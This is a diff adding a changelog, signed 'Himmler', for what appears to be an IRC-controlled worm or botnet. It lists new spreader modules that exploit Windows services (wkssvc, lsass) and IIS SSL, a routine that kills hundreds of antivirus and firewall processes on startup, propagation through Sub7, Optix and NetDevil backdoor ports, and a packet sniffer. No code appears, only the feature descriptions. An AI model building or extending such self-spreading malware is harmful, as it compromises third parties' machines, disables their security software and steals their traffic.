@@ -1,0 +1,21 @@
+******* Added/Updated By "Himmler" *******
+
+* added "Wks Spreader" with 2 commands "wkssvc = 135 / wkssvc2 = 445
+* added "lsass exploit Spreader"
+* added "iis5sll exploit spreader" fixed some lines
+* update "Processes.cpp" with 660 AV/FW to kill on startup
+* added " new port (901)&(903) to NetDevil Spreader "netdevil/netdevil2
+* added " Php sniff " to psniff.cpp
+* fixed "Sub7 port" to 27374 was 27347
+* fixed "Optix port" to 3410 was 3140
+* fixed 6 spreader commands in "advscan.cpp" ( TRUE - FALSE ) was ( FALSE - FALSE )
+
+++++++++++++++++Others++++++++++++++++
+
++ irc_connect line split truncation issue
++ disconnect for period of time and reconnect
++ p2p code add-in (for people who want it)
++ Registry editor
++ apache
++ iss
++ sll
